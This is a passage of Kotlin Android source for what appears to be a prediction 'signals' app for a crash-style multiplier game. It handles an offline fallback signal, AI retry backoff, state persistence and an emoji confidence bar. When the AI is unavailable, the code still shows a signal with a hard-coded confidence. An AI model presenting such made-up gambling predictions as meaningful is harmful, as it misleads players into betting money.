        val confianca = if (modoConservadorAtivo) 35 else 42
        val protStr = if (prot % 1.0 == 0.0) "${prot.toInt()}x" else "${String.format("%.1f", prot)}x"

        sinalProtecao = protStr
        sinalAlcMin = alcMin
        sinalAlcMax = "${alcMax}x"
        sinalTendencia = "OFFLINE"
        sinalConfianca = confianca
        sinaisAtivos = true

        val cal = Calendar.getInstance()
        horaAtual = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        sinalMinEntrada = (minAgora + 1) % 60
        sinalMinSaida = (minAgora + 2) % 60

        // M6: guardar no histórico
        val novoSinalOffline = SinalRegistado(
            timestampMs = System.currentTimeMillis(),
            protecao = prot, alcanceMin = alcMin, alcanceMax = alcMax, confianca = confianca
        )
        if (historicoSinais.size >= 10) historicoSinais.removeAt(0)
        historicoSinais.add(novoSinalOffline)
        sinalPendenteComparacao = novoSinalOffline

        // M4: vibrar mesmo com sinal offline
        dispararAlertaSinal()

        // M10: barra de confiança
        actualizarBarraConfianca(confianca)

        // Mostrar sinal na UI
        mostrarSinalCompleto(protStr, "${alcMin}x → ${alcMax}x",
            "📡 OFFLINE", confianca, "#64748b", minAgora)

        // Aviso de offline com countdown do retry
        val retrySeg = (retryIaIntervalMs / 1000).toInt()
        if (::txtAviso.isInitialized) {
            txtAviso.text = "📡 OFFLINE · IA indisponível — a tentar de novo em ${retrySeg}s"
            txtAviso.setTextColor(Color.parseColor("#94a3b8"))
            txtAviso.background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(6).toFloat()
                setColor(Color.parseColor("#0f172a"))
                setStroke(dp(1), Color.parseColor("#334155"))
            }
            txtAviso.visibility = View.VISIBLE
        }

        // Agendar retry automático da IA
        agendarRetryIA()
    }

    /**
     * Agenda uma nova tentativa da IA após um intervalo com backoff exponencial.
     * 1.ª falha → retry em 60s
     * 2.ª falha → retry em 2 min
     * 3.ª+ falha → retry em 5 min (máximo)
     * Quando a IA volta a responder, consecutivosFalhosIA=0 e o intervalo reseta.
     */
    private fun agendarRetryIA() {
        // Cancelar retry anterior se existir
        retryIaJob?.let { handler.removeCallbacks(it) }

        val intervalo = retryIaIntervalMs
        // Backoff: duplicar até 5 minutos
        retryIaIntervalMs = minOf(retryIaIntervalMs * 2, 300_000L)

        retryIaJob = Runnable {
            retryIaJob = null
            if (modoSilenciosoAtivo || emVoo) {
                // Não tentar durante o voo — reagendar para daqui a pouco
                agendarRetryIA()
                return@Runnable
            }
            if (analisandoIA) return@Runnable

            // Mostrar que está a tentar de novo
            if (::txtAviso.isInitialized) {
                txtAviso.text = "🔄 A tentar reconectar IA..."
                txtAviso.setTextColor(Color.parseColor("#f59e0b"))
                txtAviso.visibility = View.VISIBLE
            }

            // Invalidar cache para forçar chamada real à IA
            invalidarCache()
            // Resetar flags para o ciclo continuar corretamente
            analisandoIA = false
            cicloAtivo = false
            janelaJaDisparou = false
            pedirSinalIA()
        }
        handler.postDelayed(retryIaJob!!, intervalo)
    }

    /** Chamar quando a IA responde com sucesso — reseta o backoff */
    private fun resetarRetryIA() {
        retryIaJob?.let { handler.removeCallbacks(it) }
        retryIaJob = null
        retryIaIntervalMs = 60_000L   // volta ao intervalo inicial
        consecutivosFalhosIA = 0
        // Esconder aviso de offline se estava visível
        if (::txtAviso.isInitialized && txtAviso.text.contains("OFFLINE")) {
            txtAviso.visibility = View.GONE
        }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 9 — PERSISTÊNCIA DO ESTADO
    private fun guardarSinalEstado(prot: Double, alcMin: Double, alcMax: Double, conf: Int, tend: String) {
        val j = JSONObject().apply {
            put("prot", prot); put("alcMin", alcMin); put("alcMax", alcMax)
            put("conf", conf); put("tend", tend); put("ts", System.currentTimeMillis())
            put("minEntrada", sinalMinEntrada); put("minSaida", sinalMinSaida)
        }
        getSharedPreferences(PREFS_ESTADO, Context.MODE_PRIVATE)
            .edit().putString(PREFS_SINAL_JSON, j.toString()).apply()
    }

    private fun restaurarEstado() {
        val prefs = getSharedPreferences(PREFS_ESTADO, Context.MODE_PRIVATE)
        modoConservadorAtivo = prefs.getBoolean(PREFS_CONSERVADOR, false)

        val raw = prefs.getString(PREFS_SINAL_JSON, null) ?: return
        try {
            val j = JSONObject(raw)
            val ts = j.getLong("ts")
            // Só restaurar se tiver menos de 30 minutos
            if (System.currentTimeMillis() - ts > 30 * 60_000L) return

            val prot = j.getDouble("prot")
            val alcMin = j.getInt("alcMin")
            val alcMax = j.getInt("alcMax")
            val conf = j.getInt("conf")
            val tend = j.getString("tend")
            val minEntrada = j.optInt("minEntrada", -1)
            val minSaida = j.optInt("minSaida", -1)
            val ageS = (System.currentTimeMillis() - ts) / 1000

            sinalProtecao = if (prot % 1.0 == 0.0) "${prot.toInt()}x" else "${String.format("%.1f", prot)}x"
            sinalAlcMin = alcMin
            sinalAlcMax = "${alcMax}x"
            sinalTendencia = tend
            sinalConfianca = conf
            sinalMinEntrada = minEntrada
            sinalMinSaida = minSaida
            sinaisAtivos = true
            horaAtual = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)

            handler.postDelayed({
                val cor = when {
                    alcMax >= 100 -> "#ec4899"; alcMax >= 20 -> "#22c55e"
                    alcMax >= 10 -> "#f59e0b"; else -> "#3b82f6"
                }
                mostrarSinalCompleto(sinalProtecao, "${alcMin}x → ${alcMax}x", tend, conf, cor,
                    Calendar.getInstance().get(Calendar.MINUTE))
                // Aviso de restauro
                txtMinutos.text = "♻️ ${ageS}s atrás"
                txtMinutos.setTextColor(Color.parseColor("#22c55e"))
                actualizarBarraConfianca(conf)
            }, 1500)
        } catch (_: Exception) {}
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 10 — BARRA VISUAL DE CONFIANÇA
    private fun actualizarBarraConfianca(confianca: Int) {
        // Representa confiança como blocos emoji no txtAcao (em modo silencioso)
        // ou no txtMinutos quando não está em voo
        // Usa uma função utilitária para gerar a string de blocos
        val blocos = confToEmoji(confianca)
        if (!emVoo) {
            // Mostrar confiança visual no txtMinutos por 3 segundos
            txtMinutos.text = blocos
            txtMinutos.setTextColor(Color.parseColor(when {
                confianca >= 75 -> "#22c55e"; confianca >= 55 -> "#a3e635"
                confianca >= 40 -> "#fbbf24"; else -> "#f87171"
            }))
            handler.postDelayed({
                if (!emVoo) { txtMinutos.text = ""; }
            }, 3000)
        }
    }

    private fun confToEmoji(confidence: Int): String {
        val preenchidos = when {
            confidence >= 90 -> 5; confidence >= 72 -> 4; confidence >= 54 -> 3
            confidence >= 36 -> 2; confidence >= 18 -> 1; else -> 0
        }
        val emoji = when {
            confidence >= 75 -> "🟢"; confidence >= 55 -> "🟡"; else -> "🔴"
        }
        return emoji.repeat(preenchidos) + "⬜".repeat(5 - preenchidos) + " $confidence%"
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() {
        super.onDestroy(); webView.destroy()
        handler.removeCallbacksAndMessages(null)
        proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
        countdownCicloJob?.let { handler.removeCallbacks(it) }
        retryIaJob?.let { handler.removeCallbacks(it) }  // cancelar retry pendente
        soundPool?.release()  // M4: libertar recursos de som
        soundPool = null
    }
}


